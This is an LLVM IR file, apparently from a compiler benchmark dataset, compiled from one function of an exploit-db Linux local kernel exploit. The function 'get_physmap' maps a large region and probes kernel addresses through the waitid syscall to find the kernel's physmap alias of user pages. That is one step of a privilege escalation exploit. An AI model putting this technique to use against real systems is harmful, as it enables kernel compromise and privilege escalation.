; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_43127.c_get_physmap.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_43127.c_get_physmap.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.PagePair = type { i64, i64 }

@mapping_base = common dso_local global i8* null, align 8
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [13 x i8] c"mmap failed\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"mapped %p\0A\00", align 1
@done_locking = common dso_local global i32 0, align 4
@mlock_thread = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [27 x i8] c"mlock thread create error\0A\00", align 1
@mapping_begin = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [32 x i8] c"trying to find physmap mapping\0A\00", align 1
@SYS_waitid = common dso_local global i32 0, align 4
@P_ALL = common dso_local global i32 0, align 4
@WEXITED = common dso_local global i32 0, align 4
@errno = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [21 x i8] c"found mapping at %p\0A\00", align 1
@.str.6 = private unnamed_addr constant [23 x i8] c"detected change at %p\0A\00", align 1
@.str.7 = private unnamed_addr constant [28 x i8] c"second write didn't work...\00", align 1
@.str.8 = private unnamed_addr constant [22 x i8] c"physmap addr is good\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @get_physmap(%struct.PagePair* %0) #0 {
  %2 = alloca %struct.PagePair*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i64*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i64*, align 8
  %10 = alloca i64*, align 8
  %11 = alloca i32, align 4
  store %struct.PagePair* %0, %struct.PagePair** %2, align 8
  store i64 4294967296, i64* %3, align 8
  %12 = load i64, i64* %3, align 8
  %13 = inttoptr i64 %12 to i8*
  store i8* %13, i8** @mapping_base, align 8
  %14 = load i64, i64* %3, align 8
  %15 = inttoptr i64 %14 to i8*
  %16 = load i32, i32* @PROT_READ, align 4
  %17 = load i32, i32* @PROT_WRITE, align 4
  %18 = or i32 %16, %17
  %19 = load i32, i32* @MAP_SHARED, align 4
  %20 = load i32, i32* @MAP_FIXED, align 4
  %21 = or i32 %19, %20
  %22 = load i32, i32* @MAP_ANONYMOUS, align 4
  %23 = or i32 %21, %22
  %24 = call i64* @mmap(i8* %15, i32 268435456, i32 %18, i32 %23, i32 -1, i32 0)
  store i64* %24, i64** %4, align 8
  %25 = load i64*, i64** %4, align 8
  %26 = ptrtoint i64* %25 to i64
  %27 = icmp eq i64 %26, -1
  br i1 %27, label %28, label %32

28:                                               ; preds = %1
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0))
  %30 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %31 = call i32 @exit(i32 -1) #3
  unreachable

32:                                               ; preds = %1
  %33 = load i64*, i64** %4, align 8
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i64* %33)
  %35 = load i64*, i64** %4, align 8
  %36 = call i32 @memset(i64* %35, i32 65, i32 268435456)
  store i32 0, i32* @done_locking, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %37

37:                                               ; preds = %48, %32
  %38 = load i32, i32* %5, align 4
  %39 = icmp slt i32 %38, 4
  br i1 %39, label %40, label %51

40:                                               ; preds = %37
  %41 = load i32, i32* @mlock_thread, align 4
  %42 = call i64 @pthread_create(i32* %6, i32* null, i32 %41, i32* null)
  %43 = icmp ne i64 %42, 0
  br i1 %43, label %44, label %47

44:                                               ; preds = %40
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %46 = call i32 @exit(i32 0) #3
  unreachable

47:                                               ; preds = %40
  br label %48

48:                                               ; preds = %47
  %49 = load i32, i32* %5, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %5, align 4
  br label %37

51:                                               ; preds = %37
  %52 = load i32, i32* @mapping_begin, align 4
  %53 = sub i32 %52, -2147483648
  %54 = zext i32 %53 to i64
  store i64 %54, i64* %7, align 8
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0))
  br label %56

56:                                               ; preds = %51, %71
  %57 = load i32, i32* @SYS_waitid, align 4
  %58 = load i32, i32* @P_ALL, align 4
  %59 = load i64, i64* %7, align 8
  %60 = add i64 %59, 4064
  %61 = load i32, i32* @WEXITED, align 4
  %62 = call i32 (i32, i32, i32, ...) @syscall(i32 %57, i32 %58, i32 0, i64 %60, i32 %61, i8* null)
  store i32 %62, i32* %8, align 4
  %63 = load i32, i32* @errno, align 4
  %64 = icmp ne i32 %63, 14
  br i1 %64, label %65, label %71

65:                                               ; preds = %56
  %66 = load i64, i64* %7, align 8
  %67 = inttoptr i64 %66 to i8*
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i64 0, i64 0), i8* %67)
  %69 = load i64, i64* %7, align 8
  %70 = add i64 %69, 2147483648
  store i64 %70, i64* %7, align 8
  br label %74

71:                                               ; preds = %56
  %72 = load i64, i64* %7, align 8
  %73 = add i64 %72, 268435456
  store i64 %73, i64* %7, align 8
  br label %56

74:                                               ; preds = %65
  store i64* null, i64** %9, align 8
  store i64* null, i64** %10, align 8
  br label %75

75:                                               ; preds = %74, %91
  %76 = load i64, i64* %7, align 8
  %77 = add i64 %76, 16777216
  store i64 %77, i64* %7, align 8
  %78 = load i32, i32* @SYS_waitid, align 4
  %79 = load i32, i32* @P_ALL, align 4
  %80 = load i64, i64* %7, align 8
  %81 = load i32, i32* @WEXITED, align 4
  %82 = call i32 (i32, i32, i32, ...) @syscall(i32 %78, i32 %79, i32 0, i64 %80, i32 %81, i8* null)
  store i32 %82, i32* %11, align 4
  %83 = call i64* (...) @mapping_changed()
  store i64* %83, i64** %9, align 8
  %84 = icmp ne i64* %83, null
  br i1 %84, label %85, label %91

85:                                               ; preds = %75
  %86 = load i64, i64* %7, align 8
  %87 = inttoptr i64 %86 to i64*
  store i64* %87, i64** %10, align 8
  %88 = load i64, i64* %7, align 8
  %89 = inttoptr i64 %88 to i8*
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.6, i64 0, i64 0), i8* %89)
  br label %92

91:                                               ; preds = %75
  br label %75

92:                                               ; preds = %85
  %93 = load i64*, i64** %9, align 8
  %94 = getelementptr inbounds i64, i64* %93, i64 0
  store i64 1094795585, i64* %94, align 8
  %95 = load i32, i32* @SYS_waitid, align 4
  %96 = load i32, i32* @P_ALL, align 4
  %97 = load i64*, i64** %10, align 8
  %98 = load i32, i32* @WEXITED, align 4
  %99 = call i32 (i32, i32, i32, ...) @syscall(i32 %95, i32 %96, i32 0, i64* %97, i32 %98, i8* null)
  %100 = load i32, i32* @SYS_waitid, align 4
  %101 = load i32, i32* @P_ALL, align 4
  %102 = load i64*, i64** %10, align 8
  %103 = getelementptr inbounds i64, i64* %102, i64 100
  %104 = load i32, i32* @WEXITED, align 4
  %105 = call i32 (i32, i32, i32, ...) @syscall(i32 %100, i32 %101, i32 0, i64* %103, i32 %104, i8* null)
  %106 = load i64*, i64** %9, align 8
  %107 = getelementptr inbounds i64, i64* %106, i64 0
  %108 = load i64, i64* %107, align 8
  %109 = icmp ne i64 %108, 0
  br i1 %109, label %115, label %110

110:                                              ; preds = %92
  %111 = load i64*, i64** %9, align 8
  %112 = getelementptr inbounds i64, i64* %111, i64 100
  %113 = load i64, i64* %112, align 8
  %114 = icmp ne i64 %113, 0
  br i1 %114, label %115, label %117

115:                                              ; preds = %110, %92
  %116 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.7, i64 0, i64 0))
  br label %117

117:                                              ; preds = %115, %110
  %118 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.8, i64 0, i64 0))
  %119 = load %struct.PagePair*, %struct.PagePair** %2, align 8
  %120 = icmp ne %struct.PagePair* %119, null
  br i1 %120, label %121, label %130

121:                                              ; preds = %117
  %122 = load i64*, i64** %9, align 8
  %123 = ptrtoint i64* %122 to i64
  %124 = load %struct.PagePair*, %struct.PagePair** %2, align 8
  %125 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %124, i32 0, i32 0
  store i64 %123, i64* %125, align 8
  %126 = load i64*, i64** %10, align 8
  %127 = ptrtoint i64* %126 to i64
  %128 = load %struct.PagePair*, %struct.PagePair** %2, align 8
  %129 = getelementptr inbounds %struct.PagePair, %struct.PagePair* %128, i32 0, i32 1
  store i64 %127, i64* %129, align 8
  br label %130

130:                                              ; preds = %121, %117
  store i32 1, i32* @done_locking, align 4
  ret void
}

declare dso_local i64* @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i64*, i32, i32) #1

declare !callback !2 dso_local i64 @pthread_create(i32*, i32*, i32, i32*) #1

declare dso_local i32 @syscall(i32, i32, i32, ...) #1

declare dso_local i64* @mapping_changed(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
